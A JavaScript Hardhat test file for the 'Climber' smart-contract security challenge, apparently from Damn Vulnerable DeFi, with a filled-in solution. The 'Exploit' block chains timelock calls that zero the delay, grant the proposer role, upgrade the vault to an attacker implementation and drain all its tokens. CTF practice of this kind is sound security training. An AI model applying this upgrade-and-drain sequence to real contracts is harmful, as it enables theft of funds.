const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        this.newImpl = await (await ethers.getContractFactory('ClimberVaultV2', attacker)).deploy();
        this.climberAttack = await (await ethers.getContractFactory('ClimberAttack', attacker)).deploy(this.timelock.address,this.vault.address,this.newImpl.address,this.token.address);
        
        const proposer_role = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));

        let ABI1 = ["function updateDelay(uint64 delay)"];
        let intf1 = new ethers.utils.Interface(ABI1);
        let data1 = intf1.encodeFunctionData("updateDelay",[0])
        console.log('Im here')

        let ABI2 = ["function grantRole(bytes32,address)"];
        let intf2 = new ethers.utils.Interface(ABI2);
        let data2 = intf2.encodeFunctionData("grantRole",[proposer_role,this.climberAttack.address]);
        
        let ABI3 = ["function upgradeTo(address)"];
        let intf3 = new ethers.utils.Interface(ABI3);
        let data3 = intf3.encodeFunctionData("upgradeTo",[this.newImpl.address]);
        
        let ABI4 = ["function attack()"]
        let intf4 = new ethers.utils.Interface(ABI4);
        let data4 = intf4.encodeFunctionData("attack");

        let data = [data1,data2,data3,data4];
        let target = [this.timelock.address,this.timelock.address,this.vault.address,this.climberAttack.address]

        await this.climberAttack.connect(attacker).setData(target,data);
        await this.timelock.connect(attacker).execute(target,Array(data.length).fill(0),data,ethers.utils.hexZeroPad("0x00",32));


    //     await this.timelock.connect(attacker).execute([this.timelockAddress,this.timelockAddress,this.vault.address,this.climberAttack.address],[ethers.utils.parseEther("0"),ethers.utils.parseEther("0"),ethers.utils.parseEther("0"),ethers.utils.parseEther("0")],
    //     [intf1.functions.updateDelay.encode("0"),intf2.functions._setupRole.encode(["0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",this.climberAttack.address]),
    // intf3.functions._authorizeUpgrade.encode(this.newImpl.address),intf4.function.attack.encode()],"0x0000000000000000000000000000000000000000000000000000000000000020")


        await this.climberAttack.connect(attacker).withdraw(attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
